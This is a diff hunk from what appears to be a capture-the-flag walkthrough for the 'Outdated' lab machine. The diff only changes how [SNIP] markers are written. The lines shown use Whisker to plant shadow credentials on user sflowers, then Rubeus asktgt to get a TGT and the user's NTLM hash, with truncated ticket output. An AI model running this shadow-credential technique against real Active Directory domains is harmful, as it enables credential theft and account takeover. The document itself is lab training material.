@@ -144,7 +144,7 @@ PS C:\programdata> .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc
 [+] Updated the msDS-KeyCredentialLink attribute of the target object
 [*] You can now run Rubeus with the following syntax:
 
-Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz ... [SNIP]... TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
+Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz .---[SNIP]--- TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 ```
 
 #### 2. Request a TGT Using the PFX File and Get NTLM Hash
@@ -154,7 +154,7 @@ Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz ... [SNIP]... TvhwICB9A
 ```
 
 ```console {class="sample-code"}
-PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz ... [SNIP]... TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
+PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .---[SNIP]--- TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 
    ______        _                      
   (_____ \      | |                     
@@ -173,7 +173,7 @@ PS C:\programdata> .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      doIF0jCCBc ...[SNIP]... F0ZWQuaHRi
+      doIF0jCCBc ---[SNIP]--- F0ZWQuaHRi
 
   ServiceName              :  krbtgt/outdated.htb
   ServiceRealm             :  OUTDATED.HTB
